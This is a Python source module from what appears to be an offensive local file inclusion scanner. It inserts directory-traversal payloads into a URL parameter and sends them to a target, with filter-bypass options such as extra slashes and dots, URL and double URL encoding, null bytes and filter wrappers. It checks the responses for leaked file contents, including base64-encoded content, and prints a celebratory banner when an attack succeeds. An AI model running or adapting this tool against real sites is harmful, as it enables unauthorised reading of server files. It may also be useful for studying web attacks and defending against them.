from .prints import prints
from .gen_payload import Payload

import base64

TOKEN = "%%PAYLOAD%%"

class SetupExploit:
    """Creates an exploit object"""

    def __init__(self, crab_request, payload_object, url_object):
        # Initialized class that send requests as per the cmdline arguments
        self.crab_request = crab_request

        # TODO split into sub classes
        self.payload_value = payload_object.payload
        self.null_byte = payload_object.null_byte
        self.directories_transversed = payload_object.directories_transversed
        self.replace_tran = payload_object.replace_tran
        self.extra_slashes = payload_object.extra_slashes
        self.root = payload_object.root
        self.extra_dots = payload_object.extra_dots
        self.url_encode = payload_object.url_encode
        self.url_dbl_encode = payload_object.url_dbl_encode
        self.filter = payload_object.filter
        self.payload_info = payload_object.gen_payload_message()
        self.search_term = payload_object.search_term

        # URL
        # TODO split into sub classes
        self.original_url = url_object.original_url
        self.tokenized_url = url_object.token_url
        self.weponized_url = self.weponize(self.payload_value)
        self.parameter_name = url_object.parameter_name
        self.parameter_original_value = url_object.parameter_value

        # Initial Test data
        # TODO split into sub classes
        self.initial_response_time = url_object.initial_response_time
        self.initial_status_code = url_object.initial_status_code
        self.initial_status_name = url_object.initial_status_name
        self.initial_status_type = url_object.initial_status_type
        self.initial_status_info = url_object.initial_status_info
        self.initial_text = url_object.initial_text
        self.initial_response_size = len(self.initial_text)

        # Payload response data
        # TODO split into sub classess
        self.exploit_response_time = None
        self.exploit_status_code = None
        self.exploit_status_name = None
        self.exploit_status_type = None
        self.exploit_status_info = None
        self.exploit_text = None
        self.exploit_response_size = None
        self.send_exploit()

        # Other
        self.payload_success = False
        self.payload_response = None

    def weponize(self, lfi_file):
        return self.tokenized_url.replace(TOKEN, lfi_file)

    def print_payload_info(self):
        prints(self.original_url, "info")
        prints(self.tokenized_url, "info")
        prints(self.weponized_url, "info")
        prints(self.parameter_name, "info")
        prints(self.parameter_original_value, "info")

        prints(self.payload_value, "info")
        prints(self.null_byte, "info")
        prints(self.directories_transversed, "info")
        prints(self.replace_tran, "info")
        prints(self.extra_slashes, "info")
        prints(self.extra_dots, "info")
        prints(self.url_encode, "info")
        prints(self.url_dbl_encode, "info")
        prints(self.payload_info, "info")

        prints(self.initial_response_time, "info")
        prints(self.initial_status_code, "info")
        prints(self.initial_status_name, "info")
        prints(self.initial_status_type, "info")
        prints(self.initial_status_info, "info")
        # prints(self.initial_text, "info")

    def send_exploit(self):
        self.payload_response = self.crab_request.send_get(self.weponized_url)
        self.payload_success = self.validate_exploit_success()
        if self.payload_success:
            self.good_boy()
            self.set_exploit_data()
            pass
        if not self.payload_success:
            self.bad_boy()
            self.compare_before_after()

    def set_exploit_data(self):
        self.exploit_response_time = self.payload_response.response_time
        self.exploit_status_code = self.payload_response.status_code
        self.exploit_status_name = self.payload_response.status_name
        self.exploit_status_type = self.payload_response.status_type
        self.exploit_status_info = self.payload_response.status_info
        self.exploit_text = self.payload_response.text
        self.exploit_response_size = len(self.payload_response.text)

    def banner(self):
        prints("", "normal")
        prints("          .____.", "normal")
        prints("     \)__/\ \033[1;032moo\033[1;00m \/\__(/", "normal")
        prints("       _/\/_~__\/\_   \033[1;032mYOU DID IT!!!!\033[1;00m ", "normal")
        prints("_______ _/      \_    __.     _________ __   __        __", "normal")
        prints("_   ___\ \033[1;032mHACK_HUT\033[1;00m __ \_ |__  /   _____//  |_|__| ____  |  | __", "normal")
        prints(" |   \  \/\_  __ \__  \ | __ \ \_____  \\   __\  |/ ___\|  |/ /", "normal")
        prints(" |   \_____|  | \// __ \| \_\ \/        \|  | |  \  \___|    <", "normal")
        prints(" \______  /|__|  (______/_____/_________/|__| |__|\_____>__|_ \\", "normal")
        prints("        \/  ", "normal")

    def validate_exploit_success(self):
        if self.filter and self.validate_filter():
            return True
        if self.search_term in self.payload_response.text:
            return True
        else:
            return False

    def validate_filter(self):
        """Need to encode the search string in three different ways since
         base64 encodes using 3 byte blocks and we don't what point the
         search string will be in the block"""

        encoded_search_string = self.b64_string(self.search_term[3:])
        if encoded_search_string in self.payload_response.text:
            return True

    def b64_string(self, string):
        return str(base64.b64encode(bytearray(string.encode('utf-8'))).decode())

    def good_boy(self):
        prints(f"PAYLOAD\033[1;032m SUCCESS\033[1;00m {self.weponized_url}")
        prints(self.weponized_url)
        prints("PAYLOAD INFO")
        for lines in self.payload_info.split("\n"):
            prints(lines, "info")

    def bad_boy(self):
        screen_size = 220
        print_url = self.weponized_url + ((screen_size - len(self.weponized_url)) * " ")
        prints(f"{self.payload_response.status_code}\t{print_url}", "success", endchar=True)

    def compare_before_after(self):
        """Used for comparing the initial response with the payload response"""
        if self.initial_status_code != self.payload_response.status_code:
            if self.payload_response == "warning":
                pass
            elif self.payload_response == "fail":
                prints(f"{self.original_url} was responding with status code {self.initial_status_code}", "error")
                prints(f"But is now responding with status code {self.payload_response.status_name}"
                       f"{self.payload_response.status_code}", "error")
                prints(self.payload_response.initial_status_info, "info")

    def get_payload_status(self):
        return self.payload_success

    def new_payload(self, file):
        """Generates a new payload"""
        new = Payload(file, False)
        if self.root:
            new.root_file()
        if self.directories_transversed != 0:
            new.directory_traversal(self.directories_transversed)
        if self.replace_tran:
            new.sanitation_bypass_replace_tran()
        if self.extra_slashes != 0:
            new.sanitation_bypass_extra_slash(self.extra_slashes)
        if self.extra_dots != 0:
            new.sanitation_bypass_extra_dot(self.extra_dots)
        if self.url_encode:
            new.sanitation_bypass_url_encode()
        elif self.url_dbl_encode:
            new.sanitation_bypass_dbl_url_encode()
        if self.null_byte:
            new.null_byte_injection()
        if self.filter:
            new.enable_filter_wrapper()
        return new.get_payload()
